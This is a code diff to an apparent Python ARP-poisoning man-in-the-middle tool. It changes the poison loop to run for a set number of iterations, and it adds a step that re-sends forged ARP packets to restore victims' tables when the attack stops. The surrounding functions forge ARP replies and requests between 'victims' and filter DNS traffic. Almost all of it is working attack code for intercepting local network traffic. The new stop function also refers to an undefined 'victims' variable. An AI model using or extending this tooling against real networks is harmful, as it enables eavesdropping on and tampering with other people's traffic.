@@ -30,10 +30,10 @@ def forge_arp_request(src_ip, src_mac, dst_ip, dst_mac):
     	hwdst="00:00:00:00:00:00"
 	)
 	
-def poison_loop(forged_icmp_echo_requests, forged_replies, forged_requests, interface):
+def poison_loop(forged_icmp_echo_requests, forged_replies, forged_requests, interface, iterations):
 	i = 1
 	# Repeatedly sends each forged response at once and then sleeps for [interval] seconds
-	while True:
+	while iterations == 0 or i <= iterations:
 		# Send packets based on the config settings
 		if (config.arp_poison_icmp):
 			sendp(forged_icmp_echo_requests, iface=interface)
@@ -73,7 +73,7 @@ def start_arp_mitm(victims, self_mac, interface):
 		if (ip1, mac1) != (ip2, mac2)
 	]
 
-	thread = threading.Thread(target=poison_loop, args=(forged_icmp_echo_requests, forged_replies, forged_requests, interface), daemon=True)
+	thread = threading.Thread(target=poison_loop, args=(forged_icmp_echo_requests, forged_replies, forged_requests, interface, 0), daemon=True)
 
 	thread.start()
 
@@ -82,8 +82,26 @@ def start_arp_mitm(victims, self_mac, interface):
 	# todo find good timings for sending poison/stealth mode(?) (base on OS?)
 
     
-def stop_arp_mitm(thread):
+def stop_arp_mitm(thread, interface):
 	thread._delete()
+
+	# create forged packets to restore the arp tables of the victims to the valid values
+	forged_replies = [
+		forge_arp_reply(ip1, mac1, ip2, mac2)
+		for (ip1, mac1) in victims
+		for (ip2, mac2) in victims
+		if (ip1, mac1) != (ip2, mac2)
+	]
+
+	forged_requests = [
+		forge_arp_request(ip1, mac1, ip2, mac2)
+		for (ip1, mac1) in victims
+		for (ip2, mac2) in victims
+		if (ip1, mac1) != (ip2, mac2)
+	]
+
+	# run the poison loop 3 times to restore the valid entries
+	poison_loop(None, forged_replies, forged_requests, interface, 3)
 	
 def only_dns(pkt):
 	return pkt.haslayer(DNS)
@@ -106,7 +124,7 @@ def start_attack(victims, self_ip, self_mac, interface):
 
 	input("\nstop")
 
-	stop_arp_mitm(thread)
+	stop_arp_mitm(thread, interface)
 	cleanup_forward(interface)
 
 # placeholder
